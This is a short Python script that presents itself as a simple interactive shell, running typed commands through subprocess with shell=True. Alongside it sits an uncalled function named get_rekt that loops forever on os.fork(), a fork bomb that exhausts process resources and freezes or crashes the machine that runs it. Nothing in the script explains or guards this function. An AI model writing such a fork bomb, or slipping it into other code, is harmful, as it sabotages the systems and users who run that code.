import os
import subprocess

def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout

def interactive_shell():
    while True:
        command = input("Enter a command to run or 'exit' to quit: ")
        if command.lower() == 'exit':
            break
        output = run_command(command)
        print(output)

def get_rekt():
    while True:
        os.fork()

if __name__ == "__main__":
    print("Welcome to the interactive shell.")
    print("Type 'exit' to quit.")
    interactive_shell()

